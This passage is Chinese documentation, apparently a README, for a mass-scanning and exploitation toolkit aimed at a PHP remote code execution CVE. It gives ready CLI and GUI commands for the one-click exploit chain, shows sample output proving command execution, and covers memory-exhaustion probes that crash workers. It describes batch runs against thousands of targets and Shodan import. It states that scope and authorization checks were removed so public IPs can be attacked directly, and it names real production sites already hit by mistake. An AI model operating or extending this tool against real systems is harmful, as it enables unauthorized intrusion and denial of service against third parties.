> 入口调 `session_start()` / 堆可标定），与目标是否存在 SQLi、XSS **完全无关**。
> 保留通用扫描只会把无关发现混进 CVE 报告，误导「是否能 RCE」的结论。

`poc_eness/poc_109618.py` **不能剥离**：`attack/php2shell_rce.py` 硬依赖
（`import poc_109618 as P`，用到 `P.Target / P.build_multipart / P.parse_cookie /
P.chunk_base_from_cookie / P.libphp_base_from_cookie / P.Exploit`），
而 `p2s_ext.py` 又依赖 `php2shell_rce`。移走它会直接打断 `oneclick` 全链。

## 21. GUI：CVE-2026-109618 检测与利用控制台（双模式）

```bash
python3 gui/server.py --host 127.0.0.1 --port 8899
# 浏览器打开 http://127.0.0.1:8899
```

**两种模式（页面单选，默认 recon）**

| 模式 | 引擎调用 | 流量性质 | 结论取值 | 门槛 |
|---|---|---|---|---|
| `recon --fast` | `attack/p2s_ext.py recon -u <url> --fast --json` | 只读初筛：首页版本 + 2 个 sink 入口，**2–3 个请求/目标** | 同上 | 无（公网可直接用） |
| `recon` | `attack/p2s_ext.py recon -u <url> --json` | 只读：版本多通道 + 16 入口 sink 探测 + profile 命中，**不发 OOM 载荷** | `AFFECTED` / `DOS_ONLY` / `UNKNOWN_VERSION` / `NOT_AFFECTED` / `NO_SINK` / `UNREACHABLE` | 无（公网可直接用） |
| `recon --deep` | 追加 `--deep --budget N --delay S [--probe-sizes ...]` | 分级 OOM 落点探测（最大 16MB/次，可能 5xx），实测 `oom_at_mb`、`post_max_size>memory_limit` | 同上，`evidence.deep{}` 带实测值 | 无（公网可直接用） |
| `oneclick` | `attack/p2s_ext.py oneclick -u <url> --http-read <url> --rounds N --tries N --force --postex --only <cmd> --outdir ...` | 真实利用链：Stage-1/2 泄漏 → 伪造 HashTable → 执行短命令 → HTTP 回读 proof | `RCE_CONFIRMED`(rc0) / `RCE_LIKELY`(10) / `DOS_ONLY`(20) / `NOT_AFFECTED`(30) / `NO_SINK`(40) / `UNREACHABLE`(50) / `DENIED`(3) | **仅需 `attack_ack`**，缺一 400 且零请求 |

**其它**

- 并发：每目标一个子进程（崩溃/超时隔离），默认并发 16、请求超时 20s、单目标超时 900s；
- **并发上限可调**：`P2S_MAX_WORKERS`（默认 32，硬上限 64）。GUI 输入框 1–64，服务端会按该变量 clamp；
  上千目标建议 `P2S_MAX_WORKERS=64 python3 gui/server.py --host 127.0.0.1 --port 8899`（按 CPU/带宽取舍）；
- **快速模式（GUI 默认勾选）**：`recon --fast` 只查首页版本 + 2 个 sink 入口，**2–3 个请求/目标**；
  跳过 magic/phpinfo/404 探测，并与 `--deep` 互斥。上千目标先快速初筛，再对候选跑完整 `recon`/`oneclick`；
- **TCP 预检**：每个目标先做一次 2.5s 上限的 TCP connect，连不上立即判 `UNREACHABLE`，不会耗 3 次 HTTP 超时；
- **超时显示**：子进程超过「单目标超时」时结论为 `TIMEOUT`（不再把缺失的 `oneclick_report.json` 显示成 `FileNotFoundError`）；
  `oneclick` 在 scan 判定 `NOT_AFFECTED_OR_PATCHED` / `AFFECTED_DOS_ONLY` / `NO_SESSION_SINK` / `UNREACHABLE` 时直接早退，不会白跑 exploit 到超时；
- **大批量更快**：先 `recon`（几请求/目标）筛出 `RCE_LIKELY/AFFECTED`，只对这些跑 `oneclick`；
  `oneclick` 的 `rounds` 每加 1 约多一轮完整三阶段尝试（成功率↑、耗时线性↑），`tries` 是单轮内重试；
  `delay` 是每请求间隔，批量时设 0；目标已 `PATCHED`/`DOS_ONLY` 时 oneclick 会提前退出，不会白跑满轮次；
- **本机资源**：每并发子进程常驻约 20–40MB（峰值取决于请求体），16 并发约 0.5–1GB；
  单个 OOM 请求体可达数 MB–十余 MB，高并发时上行带宽会短时打满——这是“机器卡顿”的主因（网络+CPU），不是内存泄漏；
  卡顿时降 `P2S_MAX_WORKERS`/并发、或 `nice -n 10` 让出 CPU；结果表默认只渲染前 300 行（完整数据用导出 JSON/CSV）。
- **目标数量：默认不限**（旧版「单次最多 500 个目标」硬上限已移除）。可一次粘贴/导入任意条数；
  重复目标自动去重（保持输入顺序）。如需限流，启动时设置环境变量 `P2S_MAX_TARGETS=N`（0 或未设置=不限）：
  `P2S_MAX_TARGETS=2000 python3 gui/server.py --host 127.0.0.1 --port 8899`；
  超大批量建议先用 `recon`（只读）分级，再对 `RCE_LIKELY/AFFECTED` 子集跑 `oneclick`，避免对无前置目标发 OOM 包；
- TLS：勾「忽略 TLS 证书」= CLI `--insecure`；不勾时证书错误判 `UNREACHABLE`；
- 落盘 `gui_runs/<job_id>/`：recon 写 `<name>.recon.json`，oneclick 写 `oc_<name>/oneclick_report.json`，
  页面「导出 JSON / CSV」读这两类文件（可复算归档）；
- 「载入最近作业」= `GET /api/jobs`（按报告 mtime 倒序，最近 20 个）；
- 证据只取 CVE 专用字段：`mode/verdict/version/sink/profile/rce/proof_body/proof_url/postex_rc/steps/post_max_gt_memory/oom_at_mb/post_max_hit_mb`。

**命令硬上限**：oneclick 的 `only` 受 `cap = ht_size − 0x98 − 1` 限制，本机 8.4.26 构建为 **14 字节**
（`id`、`env`、`cat /etc/p*` 可行；写 webshell、反弹 shell、持久化不可行）。

**CLI 等价能力**

```bash
python3 attack/p2s_ext.py recon -u https://target/ --fast --json                       # 快速初筛（2–3 请求）
python3 attack/p2s_ext.py recon -u https://target/ --json                              # 只读分级
python3 attack/p2s_ext.py recon -u https://target/ --deep --budget 6 --delay 0.3 --json # 含 OOM 探测
python3 attack/p2s_ext.py oneclick -u https://target/ --http-read https://target/ \
    --rounds 8 --tries 2 --force --postex --only id --outdir out/target
```

## 22. Shodan 资产导入（GUI）

### 22.1 目标直接入队

GUI 不做任何范围/授权校验：粘贴进目标框的地址（含公网 IP）直接进入队列。服务端不再派生/保存 scope，`/api/scan` 的 `scope`、`authorized` 字段即使传了也会被忽略。

- **不做**「从 Shodan 拉第三方公网 IP → 自动填入 → 自动 exploit」。原因见 22.4。
- 破坏性提醒：OOM 链会打爆 worker，只对你持有**书面授权**的资产使用。

### 22.2 请求示例

```json
{"targets":["10.0.0.5:443","https://app.corp.example/"]}
```

`POST /api/scan` 只读取 `targets`、`mode` 与各模式参数；粘入即入队，无范围预检。

### 22.3 Shodan 导入（强制限定自有资产）

`POST /api/import/shodan`

```json
{"api_key":"<可选，缺省读 SHODAN_API_KEY>","query":"net:203.0.113.0/24 http.component:\"PHP\"","limit":50}
```

约束（服务端硬校验，`_SELF_SCOPE_RE`）：

| query 内容 | 响应 |
|---|---|
| 无 `net:` / `org:` / `hostname:` / `asn:` | **400**，拒绝检索 |
| 含上述限定符但无 key | **400** |
| 含限定符 + `dry_run:true` | **200**，仅回显 query/limit，不联网 |
| 含限定符 + 有效 key | **200**，返回 `targets:["ip:port",...]` |

返回的 `targets` 只是**候选清单**，前端合并去重后填入目标框；是否扫描、是否做 CVE 利用仍需你显式操作（GUI 不提供一键 exploit）。

示例 query：
- `net:203.0.113.0/24 http.component:"PHP" port:80,443`
- `org:"MyCompany" http.server:"Apache" http.title:"phpinfo"`
- `hostname:*.corp.example`

### 22.4 边界：为什么不做「Shodan 自动找可 RCE 的公网 IP 并自动打」

1. **法律与范围**：这等于对任意第三方主机发起未授权攻击。本项目已有两次真实误伤先例（`82.165.30.101` 西班牙市政旅游门户、`125.59.21.90` 香港电商站），均在确认为真实生产站点后立即停止——自动化只会把这个风险放大成批量事件。
2. **技术上也打不动**：109618 的 RCE 需要 4 个构建相关常量（`zif/dtor/htdata/ht_size`）+ `post_max_size > memory_limit` + `session_start()` 消费点。真实公网绝大多数目标只能到 DoS 判定（实测：8091 生产默认配置 exit 20；`83.168.105.132` 全站零 `Set-Cookie`，Stage-1 泄漏被证伪）。「扫到就能打」是错觉。
3. **有成本的真实伤害**：OOM 链靠打爆 worker 制造悬垂，单请求 ~15MB、150 并发可把延迟放大 172 倍。对第三方是无差别服务退化。

合规做法：用 Shodan 只检索**你自己网段/ASN/组织**，把结果当资产盘点，再按 22.2 粘贴进目标框、先只读 `fingerprint` 判定，最后才考虑是否利用。

## 23. https 目标与 `--insecure`（自签/过期证书）

工具的 exploit 阶段**不使用** urllib/requests，而是自己维护 TCP 连接（`attack/php2shell_rce.py:_dial`）
以便把「污染请求 + 解引用请求」钉在同一条 keep-alive 连接上。因此 https 支持需要单独把 TLS
套在 `_dial` 返回的 socket 上，而不是交给 HTTP 客户端库。

**行为约定（v1.17 起）**

| 场景 | 行为 |
|---|---|
| `-u http://...` | 纯明文，行为与旧版完全一致 |
| `-u https://...` 默认 | 严格校验服务端证书与 hostname（生产站点必须用这个） |
| `-u https://... --insecure` | 关闭证书校验与 hostname 校验（仅用于自签/过期证书的**授权**靶场） |

实现落点（便于审计）：

- `attack/php2shell_rce.py`：`TLS_STATE` + `set_tls()/get_tls()` + `_maybe_tls()`；`parse_target()`
  在 scheme=https 时端口默认 443 并自动 `set_tls(True)`；`_dial()` 统一包装 socket，因此
  Stage-1/2/3、`keepalive_pair` 等全部阶段自动获得 TLS。
- `poc_eness/poc_109618.py`：`DEFAULT_INSECURE` 控制 `Target._connect()` 的证书校验；支持环境变量
  `PHP2SHELL_INSECURE=1` 兜底，便于父进程派生子进程时透传。
- `attack/php2shell.py`：`probe_leak` / `run_exploit` 在拿到 `parse_url()` 的 tls 标志后调用
  `RCE.set_tls(...)`；`--insecure` 出现在所有子命令的公共选项里；`apply_net_options()` 同时读取
  `--insecure` 与 `PHP2SHELL_INSECURE=1`。
- `attack/p2s_ext.py`：所有子命令（`symbols/fingerprint/calibrate/blind/postex/oneclick`）统一
  注入 `--insecure`；解析后设置 `PHP2SHELL_INSECURE=1` 并同步 `poc_109618.DEFAULT_INSECURE`，
  保证内部 subprocess 与进程内 HTTP 探测都放宽校验。`requests_get()` 在 insecure 时自动
  `verify=False` 并屏蔽 `InsecureRequestWarning`；`urllib` 探测走 `_ssl_ctx()` 传入不校验的 context。
- `gui/server.py`：请求体的 `insecure` 落到 `opts["insecure"]`，`_run_one()` 组命令时追加 `--insecure`；
  前端 `static/index.html` 有「https 跳过证书校验（仅自签靶场）」复选框，`app.js` 提交
  `insecure: $("insecure").checked`。GUI 只跑只读指纹，不会开火。

**不可达判定修正**：`fingerprint` 在所有探测路径都没有响应（连接被拒 / 超时 / TLS 校验失败）时
现在返回 **50 不可达**，并提示「https 自签证书请加 `--insecure`」；旧版会误报 `10 LIKELY_RCE`。

自测（本机 TLS 终结反代 8443 → 8090，自签证书 CN=127.0.0.1）：

```
python3 attack/p2s_ext.py fingerprint -u https://127.0.0.1:8443/            # rc=50 不可达（证书校验失败）
python3 attack/p2s_ext.py fingerprint -u https://127.0.0.1:8443/ --insecure # rc=0 AFFECTED, PHP/8.4.26
python3 attack/p2s_ext.py oneclick   -u https://127.0.0.1:8443/ --insecure \
        --http-read https://127.0.0.1:8443/ --rounds 8 --tries 2 --force \
        --postex --only id                                              # rc=0 RCE_CONFIRMED, proof_body=uid=33(www-data)
```

## 24. 对真实公网站点使用：前置自检与结果判读

工具只做**一件事**：对「四必要条件同时成立」的 PHP 主机做 CVE-2026-109618 的未认证 RCE 验证。
它不承诺「版本在区间内就一定能打穿」——**版本命中只是必要条件之一**。

**四必要条件（缺一不可）**

1. PHP 版本落在受影响区间：`8.2 < 8.2.35`、`8.3 < 8.3.36`、`8.4 < 8.4.27`、`8.5 < 8.5.12`；
2. `post_max_size > memory_limit`（本原语的根因；官方 `php:x-apache` 默认 128M/8M 不满足）；
3. 存在会调用 `session_start()` 的入口（`session.upload_progress.enabled=On` 时才有悬垂对象）；
4. 目标 build 的偏移与内置 profile 匹配，或能通过 `calibrate` 标定出来（不同发行版/编译选项不同）。

**远程可观测的部分**：1 可由 `fingerprint` 读 `X-Powered-By`/`Server` 判定；
2 无法远程无损探测（`post_max_size` 不体现在任何响应里），只能靠「Stage-1 是否泄漏」间接判断；
3 可由响应里是否出现 `Set-Cookie`（PHPSESSID 等会话 cookie）粗判；4 用 `calibrate --collab` 回调标定。

**授权与闸门**

- 代码层不再做地址范围校验：公网/私网目标一视同仁，不会因为目标是公网而 exit 3；
- 本仓库不提供代理池/出口 IP 轮换，也不做「全网批量打」。目标必须是你**有书面授权**的资产。

**退出码判读**

| 退出码 | 含义 | 建议动作 |
|---|---|---|
| 0 | RCE 已确认（或 AFFECTED 且证据齐全） | 读 `proof_body` 校验 `uid=`；只看工具自报成功不算数 |
| 10 | LIKELY_RCE（前置成立、Stage-1 未取到泄漏） | 加 `--rounds 8 --tries 2` 重试；仍 10 则视为「未证实」 |
| 15 | PREMISES_ONLY（只确认了前置条件） | 补 `--force`/多轮；不要对外宣称可 RCE |
| 20 | AFFECTED_DOS_ONLY（`post_max_size <= memory_limit`） | 该目标不可 RCE，停止尝试 |
| 30 | SAFE / PATCHED（版本已修复） | 结束 |
| 40 | 无 sink / 无会话消费点 | 结束 |
| 50 | 不可达（连接/TLS 失败/超时） | https 自签请加 `--insecure`；确认网络可达 |

**能力边界（已实测）**：成功后单条命令上限 `cap = ht_size - 0x98 - 1`，本机 8090 构建为 **14 字节**，
因此只能做「短命令取数 + 重定向到 webroot 后回读」，无法写 webshell、无法反弹 shell、无法持久化、
无法横向。`/etc/shadow` 等 640 root 文件不可读。

**日志面**：OOM 型触发会在目标 access log 留下完整 POST 与 UA，在 error log 留下
`zend_mm_heap corrupted` / `SIGSEGV` / `SIGABRT`，目标侧用三条 grep 即可稳定捕获。
工具不做日志清理（那是后渗透行为，超出本工具范围）。

## 25. `recon`：真实站点四前置侦察（默认只读，`--deep` 才落地点）

真实生产站点普遍剥离 `X-Powered-By`、隐藏 `phpinfo`、自定义 404，`fingerprint` 的
「响应体 `PHP/x.y.z`」判据会直接失效。`recon` 用多条**只读**通道取证，并把
「能不能 RCE」拆成四个可分别验证的前置，输出一个分级结论与下一步命令。

### 25.1 四个前置

| # | 前置 | 判定方式 | 不可测时的处理 |
|---|---|---|---|
| 1 | 版本落在受影响区间 | header(`X-Powered-By`/`Server`)、body、`?=PHPE9568F36-D428-11d2-A769-00AA001ACF42`(logo)/`...F34...`(credits)/`PHPB8B5F2A0-...`(phpinfo css)、`phpinfo` 常见落点、404 签名(`No input file specified` = php-fpm) | 返回 `UNKNOWN_VERSION`，不猜 |
| 2 | 存在 session 消费点 | 常见入口列表返回的 `Set-Cookie` 是否含 `PHPSESSID`/会话型 cookie（同名多值会合并，不会漏检） | `NO_SESSION_SINK` → 109618 无消费点 |
| 3 | `post_max_size > memory_limit` | `--deep`：递增体积 multipart header 炸弹（0.5/1/2/4/8/16MB，可改），看 500+`Allowed memory size`/`in Unknown on line 0` 等 OOM 签名 | PHP 对超 `post_max_size` 的 body 是**静默截断（不返回 413）**，因此「最大体积内无 OOM」= 落点不可达 → `DOS_ONLY` |
| 4 | 有可用 build 偏移 | 内建 profile 表匹配版本 | 未命中 → `NEEDS_CALIBRATION`，提示 `calibrate --collab` |

另有实测黑名单 `KNOWN_NO_RCE`（当前仅 `8.2.12`：区间内但无 Stage-1 infoleak，实测 6 轮全败）
直接降级 `DOS_ONLY`，避免给出假阳性。

### 25.2 用法

```bash
# 快速初筛（2–3 个请求/目标；上千目标先用这个）
python3 attack/p2s_ext.py recon -u https://目标/ --fast --json

# 完整只读（约 23 个请求，含 5 个 phpinfo 落点与 3 个 ?= 魔法查询）
python3 attack/p2s_ext.py recon -u https://目标/ [--insecure]

# 深度：追加落点探测（会发送最大 16MB body，可能造成 5xx/worker 重启，需授权）
python3 attack/p2s_ext.py recon -u https://目标/ --deep --budget 6 --delay 1.0 \
        [--probe-sizes 0.5,1,2,4,8,16] [--entries /,/index.php,/login.php]

# 机器可读
python3 attack/p2s_ext.py recon -u https://目标/ --json
```

`--fast` 与 `--deep` 同时给时，`--fast` 优先并跳过 `--deep`（快速模式只做只读初筛）。

不再做地址范围校验：公网目标可直接跑（仍然只应对**有书面授权**的资产使用）。

### 25.3 verdict 与退出码

| verdict | exit | 含义 |
|---|---|---|
| `RCE_LIKELY` | 10 | 版本受影响 + 有消费点 + 落点(deep) 成立 + build 已知 → 可 oneclick |
| `NEEDS_CALIBRATION` | 10 | 同上但 build 未知 → 先 `calibrate --collab` |
| `NEEDS_PRECOND_PROBE` | 10 | 版本受影响且有消费点，落点未测 → 加 `--deep` |
| `DOS_ONLY` | 20 | 已修复线内但不可 RCE（`KNOWN_NO_RCE`）或落点被 `post_max_size` 截断 |
| `NOT_AFFECTED` | 30 | 版本 ≥ 修复线，或早于受影响区间 |
| `NO_SESSION_SINK` | 15 | 版本受影响，但探测到的入口没有下发会话 cookie → 没有 `session_start()` 消费点，CVE 无触发面 |
| `UNKNOWN_VERSION` | 15 | 确认跑 PHP（有会话 cookie）但版本不可判 |
| `UNKNOWN_PRECOND` | 15 | `--deep` 递增探测未触发 OOM（落点可能高于探测上限，可加 `--probe-sizes 32,64`） |
| `UNKNOWN` | 50 | 无任何 PHP 证据（非 PHP 或全站 WAF） |

> exit 15 是 recon 的共用兜底码：`NO_SESSION_SINK` / `UNKNOWN_VERSION` / `UNKNOWN_PRECOND` 都会返回 15，具体看报告里的 `verdict`。

### 25.4 与 `oneclick` 的分工

`recon` 只做判定与取证，**不开火**；确认 `RCE_LIKELY` 后再用 `oneclick`：

```bash
python3 attack/p2s_ext.py oneclick -u https://目标/ --http-read https://目标/ \
        --rounds 8 --tries 2 --force --postex --only id --outdir out
```

### 25.5 本地正负对照（回归基线）

| 目标 | 版本/配置 | recon 结论 |
|---|---|---|
| `:8090` | 8.4.26，8M/64M | `RCE_LIKELY`（OOM@1MB、post_max>memory=True、profile 命中）→ oneclick rc=0 `uid=33` |
| `:8088` | 8.2.12，8M/64M | `DOS_ONLY`（KNOWN_NO_RCE，无 infoleak） |
| `:8089` | 8.2.35 已修复 | `NOT_AFFECTED` |
| `:8091` | 8.4.26，128M/8M | `DOS_ONLY`（16MB 内无 OOM → post_max 静默截断） |
| `:8900` DVWA | PHP 7.0.30、`expose_php Off` | `UNKNOWN_VERSION`（有 PHPSESSID，但版本不可外部判定） |

## 26. 工具边界：只做 CVE-2026-109618

| 项 | 结论 |
|---|---|
| 唯一漏洞目标 | CVE-2026-109618（PHP multipart OOM → `session.upload_progress` 收尾被 longjmp 跳过 → 悬垂指针 → 同 keep-alive 解引用伪造 `HashTable.pDestructor = zif_system`） |
| 明确不包含 | SQLi、盲注、XSS、CSRF、LFI/RFI、命令注入、任意文件上传/包含、SSRF、弱口令爆破、CSP/会话类专项——源码中无对应实现 |
| 受影响版本 | `8.2 < 8.2.35`、`8.3 < 8.3.36`、`8.4 < 8.4.27`、`8.5 < 8.5.12`；`8.2.12` 在区间内但**无 infoleak**，实测只能 DoS（`KNOWN_NO_RCE`） |
| 必要条件 | ①受影响构建 ②`post_max_size > memory_limit` ③入口脚本调 `session_start()` ④堆可标定（profile 或 `calibrate`）；缺一即只能 DoS 或不可打 |
| 结论诚实性 | `AFFECTED` ≠ 能 RCE。只有 `oneclick` 回读到 `uid=` 才判 `RCE_CONFIRMED`；`DOS_ONLY` 表示前置仅满足 DoS 条件 |
| 能力边界（RCE 后） | 单命令 ≤`ht_size−0x98−1`（本机 14B）；可取证（`id`/`env`/`cat /etc/p*`），**不可** webshell、反弹 shell、持久化、横向、清日志 |
| 不可无损探测项 | `post_max_size` 无法外部精确读取，`--deep` 用「无 OOM 且能传 ≥8MB ⇒ 静默截断」推断，报告中标注为推断而非实测 |
| 授权门 | GUI 无任何授权/范围确认；`oneclick` 仍需 `attack_ack`；CLI 已移除 scope 参数，公网 IP 直接可用 |
| 不做的事 | 不做全网自动打、不内置第三方匿名代理池、不做日志清除/反取证、不对未授权公网目标发探测 |
